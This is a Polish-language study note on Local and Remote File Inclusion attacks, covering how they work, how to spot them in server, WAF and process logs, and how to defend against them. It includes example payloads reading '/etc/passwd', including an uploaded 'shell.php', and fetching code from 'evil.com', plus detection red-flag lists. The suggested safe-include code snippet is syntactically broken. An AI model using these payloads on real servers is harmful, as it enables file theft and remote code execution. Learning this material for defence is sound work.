# lfi_rfi

## Cel
Zapoznanie się i zrozumienie mechaniki działania ataku LFI/RFI oraz sposobów jego wykrywania i obrony przed nim.

## Co to jest 
- LFI - Local File Inclusion - to atak, w którym aplikacja dołącza lokalny plik na podstawie danych od użytkownika, np parametru `?page=...`, 
- RFI - Remote File Inclusion - podobnie jak wyżej, z tą różnicą, że plik aplikacja pobiera z zewnętrznego serwera. 

## Cel
- odczytanie plików systemowych, 
- wykonanie własnego kodu na serwerze (po wgraniu złośliwego pliku np. przez File Upload), 
- uzyskanie możliwości zdalnego wykonywania poleceń (RCE) - przejęcie kontroli nad serwerem, 
- otworzenie reverse shell. 

## Jak działa
### LFI - Local File Inclusion (lokalne) 
- aplikacja ma funkcję, która dołącza plik na podstawie parametru. Przykładowo strona z podstronami: `https://example.com/index.php?page=home.php`. Kod w PHP robi: `include($_GET['page']);` - czyli: weź to, co jest w parametrze `page` i dołącz jako plik. 
	- normalne użycie - użytkownik klika "O nas" -> `?page=about.php` -> aplikacja dołącza `about.php` i pokazuje tę podstronę, 
	- nieuczciwe użycie - kiedy atakujący modyfikuje parametr i może: 
		- odczytać plik systemowy (jak Path Traversal):
		```
				?page=../../etc/passwd
		```
		Aplikacja, zgodnie z podanym parametrem dołącza plik `/etc/passwd` i pokazuje jego zawartość na stronie,
		- wykonać kod:
		``` 
				?page=../../uploads/shell.php
		```
		Aplikacja wówczas dołącza `shell.php` i wykonuje go (!). Jeśli atakujący wcześniej umieścił tam złośliwy plik, np. przez File Upload, to teraz ma możliwość zdalnego wykonywania kodu - może uruchamiać polecenia na serwerze. 
### RFI - Remote File Inclusion (zdalne)
Tak samo jak LFI z tą różnicą, że plik jest na serwerze atakującego, nie lokalnie. Np. `?page=http://evil.com/shell.txt`. Aplikacja pobiera plik z `evil.com` i wykonuje go. To bardzo niebezpieczny scenariusz, ponieważ atakujący nie musi wgrywać pliku na serwer ofiary, wystarczy, że ma własny serwer z kodem. Aplikacja sama go pobierze i uruchomi. Warunek: RFI zadziała wyłącznie wtedy, gdy aplikacja pozwala na dołączanie zdalnych plików `allow_url_include` (domyślnie wyłączone). Dlatego warto zwrócić uwagę czy ten parametr nie został włączony. 

## Jak wykryć 
- w logach serwera - czerwone flagi: `../`, `..%2f`, `%2e%2e%2f`, `/etc/passwd`, `/etc/shadow`, `C:\Windows\`, `http://`, `https://`, `ftp://`, `.php`, `.jsp`, `.asp` w parametrze include. Np: `GET /index.php?page=../../etc/passwd HTTP/1.1 200`, 
- w logach aplikacji - jeśli aplikacja loguje wywołania `include/require` sprawdzenie pod kątem:
	- plików dołączanych spoza aplikacji, 
	- dołączonych plików z rozszerzeniem `.php` w katalogach upload, 
	- ścieżki z `..`, 
	- zdalne URL, 
- w logach WAF - WAF może blokować i logować payloady z `../`, `http://` czy ścieżkami systemowymi. Dlatego należy przeglądać alerty z WAF z payloadem w polu payload - to pokaże co dokładnie atakujący próbował wstrzyknąć. UWAGA: należy mieć na uwadze false positives, ponieważ niektórzy użytkownicy legalnie wpisują `../` w polach tekstowych (np. w kodzie na blogu). Należy zawsze sprawdzać kontekst, czy endpoint normalnie przyjmuje takie dane,
- korelacja z innymi zdarzeniami - ataki LFI/RFI często idą w parze z innymi atakami, dlatego należy sprawdzać czy w tym samym czasie nie ma:
	- File Upload (POST na `/upload`) z tego samego IP - atakujący mógł najpierw wgrać plik a potem go dołączyć, 
	- Path Traversal z tego samego IP - może wskazywać na rekonesans przed LFI, 
	- Command Injection z tego samego IP - atakujący mógł próbować też innych sposobów, 
	- nietypowe żądania do `/uploads` - próba dostępu do wgranych plików, 
	- przykład korelacji: 
		```
		10:00 IP X -> POST /upload (wgranie shell.php) <- File Upload
		10:05 IP X -> GET /index.php?page=../../uploads/shell.php <- LFI
		10:10 IP X -> GET /shell.php?cmd=whoami <- Command Injection przez shell
		```
- Monitoring procesów i plików - w przypadku powodzenia LFI na serwerze mogą pojawiać się nietypowe procesy uruchamiane przez użytkownika aplikacji:
	- procesy uruchamiane przez `www-data`, `apache`, `nginx`, których nie powinno być, np. `bash`, `sh`, `whoami`, `wget`, `curl`, 
	- nowe pliki w `/tmp`, `/var/tmp`, `/uploads`, 
	- zmiany w plikach aplikacji. 

## Jak się bronić
- biała lista plików - aplikacja pozwala tylko na określone pliki, np. `about.php`, `home.php`, itp, 
- unikanie dynamicznego `include` - zamiast używać `include($_GET['page'])` można użyć `if ($page == 'home') include; home.php`, 
- wyłączenie `allow_url_include` - to zabezpieczy przed pobieraniem plików z linku i zablokuje RFI, 
- walidacja ścieżki - czyli sprawdzanie pod kątem niedozwolonych znaków, 
- minimalne uprawnienia - aplikacja nie powinna działać jako root, 
- WAF - blokuje payloady z `../` oraz `http://` w parametrach include. 
